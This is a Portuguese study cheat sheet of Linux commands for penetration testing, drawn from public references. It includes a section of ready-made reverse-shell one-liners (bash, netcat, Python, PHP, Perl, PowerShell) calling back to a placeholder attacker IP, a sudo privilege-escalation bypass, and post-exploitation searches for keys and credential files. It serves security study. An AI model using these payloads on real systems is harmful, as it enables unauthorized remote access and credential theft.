> ⚠️ Notas de estudo pessoal, compiladas a partir de referências públicas (HackTricks, PayloadsAllTheThings, g0tmi1k, GTFOBins) para fins educacionais.

# Linux Commands for Cybersecurity

## Enumeração e Reconhecimento

| Comando | Função |
|---|---|
| hostname | Exibe o nome do host atual. |
| uname -a | Mostra informações do kernel e da arquitetura do sistema. |
| ip a | Lista endereços IP e interfaces de rede. |
| ip route | Mostra as rotas de rede do sistema. |
| ss -tulpn | Exibe portas abertas e processos associados. |
| netstat -tulpn | Mostra conexões e portas de rede abertas. |
| nmap -sC -sV <IP> | Realiza varredura de serviços e versões no alvo. |
| nmap -p- <IP> | Varre todas as portas TCP do alvo. |
| nmap -A <IP> | Faz varredura agressiva com detecção de SO e scripts. |
| sudo -l | Lista comandos permitidos para execução com sudo. |
| whoami | Mostra o usuário autenticado no momento. |
| id | Apresenta o ID do usuário e seus grupos. |

## Privilege Escalation em Linux

| Comando | Função |
|---|---|
| sudo -l | Identifica comandos permitidos para execução com sudo. |
| id | Confere privilégios e grupos do usuário atual. |
| cat /etc/passwd | Lista usuários do sistema para análise inicial. |
| cat /etc/sudoers | Mostra regras de sudo e permissões elevadas. |
| find / -perm -4000 2>/dev/null | Localiza binários com bit SUID. |
| find / -type f -name '*.sh' 2>/dev/null | Procura scripts relevantes para exploração. |
| crontab -l | Exibe tarefas agendadas do usuário atual. |
| ls -la /var/spool/cron | Lista cronjobs do sistema para revisão. |
| find / -type f -perm -u=s 2>/dev/null | Procura arquivos com SUID em diretórios específicos. |
| grep -R "NOPASSWD" /etc/sudoers* /etc/sudoers.d/ 2>/dev/null | Procura entradas de sudo sem senha. |
| getcap -r / 2>/dev/null | Lista capacidades especiais de arquivos binários. |
| sudo -u#-1 /bin/bash | Tenta obter shell como root via sudo. |

## Reverse Shells

| Comando | Função |
|---|---|
| bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 | Abre uma shell remota reversa para o atacante. |
| nc -e /bin/bash <IP> <PORT> | Conecta uma shell de volta usando Netcat. |
| nc -lvnp <PORT> | Escuta conexões para receber uma shell reversa. |
| python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("<IP>",<PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])' | Gera uma reverse shell em Python. |
| php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3");' | Cria uma shell reversa com PHP. |
| perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");' | Executa uma reverse shell em Perl. |
| powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -gt 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendback2 = [System.Text.Encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendback2,0,$sendback2.Length);$stream.Flush()};$client.Close()" | Gera uma reverse shell em PowerShell. |
| rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f | Cria uma shell reversa via FIFO e Netcat. |

## Manipulação de Arquivos e Permissões

| Comando | Função |
|---|---|
| ls -la | Lista arquivos ocultos e detalhes de permissões. |
| chmod 700 arquivo | Define permissões restritas para um arquivo. |
| chmod 755 diretório | Ajusta permissões de execução para diretórios. |
| chown user:user arquivo | Troca o proprietário de um arquivo ou diretório. |
| chgrp grupo arquivo | Altera o grupo de um arquivo. |
| find / -type f -perm -0002 2>/dev/null | Procura arquivos com permissões amplas. |
| find / -type f -perm -4000 2>/dev/null | Localiza arquivos SUID em busca de escalonamento. |
| find / -type f -user root 2>/dev/null | Procura arquivos pertencentes ao usuário root. |
| stat arquivo | Exibe detalhes de metadata, dono e permissões. |

## Rede e Conectividade

| Comando | Função |
|---|---|
| ifconfig | Exibe configurações de rede de interfaces antigas. |
| ip addr | Mostra informações de interfaces e endereços IP. |
| ss -tulpn | Lista sockets e portas abertas em uso. |
| netstat -antp | Exibe conexões TCP/UDP e processos associados. |
| tcpdump -i eth0 | Captura tráfego na interface especificada. |
| tcpdump -n -A host <IP> | Captura pacotes com análise textual simples. |
| nc -zv <IP> <PORT> | Testa se uma porta está aberta. |
| nc -lvnp <PORT> | Escuta conexões para servir de endpoint. |
| curl -I http://<IP> | Faz uma requisição HEAD para verificar um serviço. |

## Análise de Processos

| Comando | Função |
|---|---|
| ps aux | Lista processos em execução com detalhes. |
| ps -ef | Exibe processos em formato mais completo. |
| top | Monitora processos e uso de recursos em tempo real. |
| htop | Exibe uma versão interativa e visual de top. |
| pstree | Mostra a árvore de processos do sistema. |
| lsof -i | Lista sockets e processos associados às portas. |
| lsof -p <PID> | Mostra arquivos abertos por um processo específico. |
| pgrep -af python | Procura processos por nome ou argumento. |

## Hashes e Criptografia

| Comando | Função |
|---|---|
| md5sum arquivo | Gera o hash MD5 de um arquivo. |
| sha256sum arquivo | Gera o hash SHA-256 de um arquivo. |
| sha1sum arquivo | Gera o hash SHA-1 de um arquivo. |
| john --wordlist=wordlist.txt hash.txt | Tenta quebrar hashes com um dicionário. |
| hashcat -m 1000 hash.txt wordlist.txt | Quebra hashes NTLM com uma wordlist. |
| hashcat -m 1400 hash.txt wordlist.txt | Quebra hashes SHA-256 com uma wordlist. |
| file arquivo | Identifica o tipo de arquivo e possíveis formatos. |
| openssl sha256 arquivo | Calcula o hash SHA-256 via OpenSSL. |

## SSH e Túneis

| Comando | Função |
|---|---|
| ssh user@<IP> | Conecta a um host remoto via SSH. |
| ssh -i chave.pem user@<IP> | Conecta usando uma chave privada específica. |
| ssh -L 8080:<IP>:80 user@<IP> | Cria um túnel local para encaminhar tráfego. |
| ssh -R 9000:localhost:80 user@<IP> | Cria um túnel remoto para encaminhar tráfego. |
| ssh -D 1080 user@<IP> | Abre um SOCKS proxy via SSH. |
| ssh -N -f -L 3306:localhost:3306 user@<IP> | Mantém um túnel ativo em segundo plano. |
| ssh-keygen -t ed25519 | Gera um par de chaves SSH. |
| ssh-copy-id user@<IP> | Copia a chave pública para um host remoto. |

## Transferência de Arquivos

| Comando | Função |
|---|---|
| nc -lvnp <PORT> > arquivo | Recebe arquivos via Netcat. |
| nc -w 3 <IP> <PORT> < arquivo | Envia arquivos via Netcat. |
| python3 -m http.server <PORT> | Sobe um servidor HTTP simples para download. |
| wget http://<IP>:<PORT>/arquivo | Baixa arquivos de um servidor HTTP. |
| curl -O http://<IP>:<PORT>/arquivo | Faz download de arquivos com cURL. |
| scp arquivo.txt user@<IP>:/tmp/ | Copia arquivos via SSH. |
| rsync -avz arquivo user@<IP>:/tmp/ | Sincroniza arquivos de forma eficiente via SSH. |
| curl -I http://<IP> | Faz uma requisição HEAD para verificar um serviço. |

## Pós-Exploração

| Comando | Função |
|---|---|
| whoami | Confirma o usuário comprometido após a exploração. |
| id | Verifica privilégios e grupos atuais. |
| uname -a | Coleta informações do sistema alvo. |
| cat /etc/hosts | Exibe mapeamento de hosts do sistema. |
| cat /etc/passwd | Lista usuários do sistema para análise inicial. |
| find /home -type f 2>/dev/null | Procura arquivos relevantes em diretórios de usuários. |
| find / -type f \( -name '*.key' -o -name '*.pem' -o -name '*.txt' \) 2>/dev/null | Busca credenciais e arquivos sensíveis. |
| ps aux | Lista processos em execução para análise. |
| netstat -antp | Mostra conexões de rede e processos associados. |
| ls -la /home | Lista arquivos e diretórios de usuários. |
| journalctl -xe | Exibe logs do sistema para investigação. |
